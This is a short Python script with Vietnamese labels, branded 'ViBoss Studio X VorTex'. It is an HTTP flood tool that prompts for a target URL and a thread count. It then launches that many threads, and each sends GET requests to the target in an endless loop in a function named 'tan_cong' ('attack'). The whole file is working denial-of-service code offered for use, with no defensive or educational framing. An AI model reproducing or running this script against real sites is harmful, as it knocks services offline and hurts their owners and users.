import os
import requests
import threading

def tan_cong(target):
    try:
        while True:
            res = requests.get(target)
            print("Đã gửi yêu cầu!")
    except requests.exceptions.ConnectionError:
        print("[!!!] Lỗi kết nối!")

def print_centered_red(text):
    # Thay đổi màu sắc văn bản sang đỏ
    RED = '\033[91m'
    RESET = '\033[0m'
    
    # Lấy kích thước của cửa sổ terminal
    try:
        columns, rows = os.get_terminal_size()
    except OSError:
        columns, rows = 80, 20

    # Căn giữa văn bản
    lines = text.split('\n')
    centered_lines = [(line.center(columns)) for line in lines]
    centered_text = '\n'.join(centered_lines)
    
    # In văn bản màu đỏ
    print(RED + centered_text + RESET)

# Xóa màn hình trước khi in
os.system("cls" if os.name == "nt" else "clear")

so_luong_luon = 100

print_centered_red("""
ViBoss Studio  X   VorTex

https://github.com/dhungx/ 
""")

url = input("Nhập URL: ")

try:
    so_luong_luon = int(input("Số lượng luồng: "))
except ValueError:
    exit("Số lượng luồng không hợp lệ!")

if so_luong_luon == 0:
    exit("Số lượng luồng không hợp lệ!")

if not url.__contains__("http"):
    exit("URL không chứa http hoặc https!")

if not url.__contains__("."):
    exit("Tên miền không hợp lệ!")

for i in range(0, so_luong_luon):
    luong = threading.Thread(target=tan_cong, args=(url,))
    luong.start()
    print(str(i + 1) + " luồng đã được khởi động!")